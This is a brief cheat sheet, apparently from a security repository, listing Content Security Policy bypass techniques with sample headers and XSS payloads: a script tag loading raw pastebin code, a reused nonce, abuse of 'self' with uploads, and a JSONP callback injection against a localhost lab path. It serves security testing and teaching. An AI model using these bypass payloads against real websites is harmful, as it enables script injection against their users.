# Content Security Policy (CSP) Bypass

## Pastebin CSP

```http
Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
```

https://pastebin.com seems to be an valid CSP.

```js
<script src="https://pastebin.com/raw/R570EE00"></script>
```

## Invalid CSP Keyword
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=
```

nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA= seems to be an invalid CSP keyword.

```js
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```

## SELF

```js
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=
Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
```

'self' can be problematic if you host JSONP, Angular or user uploaded files.

```js
poc.js:
alert(document.domain);

<script src="poc.js"></script>
```

## Self-insecure JSONP implementation

```js
Content-Security-Policy: script-src 'self';
```

'self' can be problematic if you host JSONP

#### POC:
http://localhost/vulnerabilities/csp/source/jsonp.php?callback=alert(document.domain)

## BESTTT :)
* https://csp-evaluator.withgoogle.com/
* https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques
